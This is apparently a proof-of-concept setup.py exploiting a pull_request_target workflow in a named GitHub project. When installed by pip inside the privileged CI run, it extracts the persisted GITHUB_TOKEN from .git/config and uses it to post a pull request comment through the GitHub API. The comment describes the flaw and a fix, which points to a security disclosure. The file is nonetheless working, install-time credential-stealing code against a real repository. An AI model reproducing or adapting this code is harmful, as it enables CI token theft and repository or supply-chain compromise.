"""
PoC for pull_request_target RCE in PlaceholderAPI/.github/workflows/validate_site.yml.

This setup.py is executed by `pip install -r requirements.txt` inside the
privileged pull_request_target run. It uses the auth header that
actions/checkout persisted in .git/config to post a comment on the PR
that triggered this run.
"""
import base64
import json
import os
import re
import sys
import traceback
import urllib.request


def _log(msg):
    print(f"[poc] {msg}", file=sys.stderr, flush=True)


def _run():
    workspace = os.environ.get("GITHUB_WORKSPACE")
    event_path = os.environ.get("GITHUB_EVENT_PATH")
    repo = os.environ.get("GITHUB_REPOSITORY")
    run_id = os.environ.get("GITHUB_RUN_ID", "?")
    _log(f"GITHUB_WORKSPACE={workspace}")
    _log(f"GITHUB_REPOSITORY={repo}")
    if not (workspace and event_path and repo):
        _log("missing required env; bailing")
        return

    cfg_path = os.path.join(workspace, ".git", "config")
    cfg = open(cfg_path).read()
    m = re.search(r"AUTHORIZATION:\s*basic\s+([A-Za-z0-9+/=]+)", cfg)
    if not m:
        _log("no extraheader token in .git/config; bailing")
        return
    decoded = base64.b64decode(m.group(1)).decode("utf-8", "replace")
    # decoded looks like "x-access-token:ghs_..."
    _, _, token = decoded.partition(":")
    _log(f"token len={len(token)} prefix={token[:4]}")

    event = json.load(open(event_path))
    pr_num = event["pull_request"]["number"]
    pr_user = event["pull_request"]["user"]["login"]

    body = (
        "**PoC: pull_request_target RCE**\n\n"
        f"This comment was posted from `setup.py` while `pip install -r "
        f"requirements.txt` was running inside `validate_site.yml` "
        f"(run #{run_id}).\n\n"
        f"The workflow checks out PR head (`{pr_user}`'s code) and pip-installs "
        f"a PR-controlled `requirements.txt` with the persisted `GITHUB_TOKEN` "
        f"still in `.git/config`. Any fork PR can do this.\n\n"
        "Fix: remove `pull_request_target` (use `pull_request`), or split into "
        "an unprivileged build job + a privileged comment job."
    )
    url = f"https://api.github.com/repos/{repo}/issues/{pr_num}/comments"
    req = urllib.request.Request(
        url,
        data=json.dumps({"body": body}).encode(),
        method="POST",
        headers={
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github+json",
            "User-Agent": "prt-poc",
        },
    )
    with urllib.request.urlopen(req, timeout=15) as r:
        _log(f"comment POST status={r.status}")


try:
    _run()
except Exception:
    traceback.print_exc()

# Keep pip happy — define a trivial package so the install itself succeeds.
from setuptools import setup
setup(name="evil-pkg", version="0.0.0", py_modules=[])
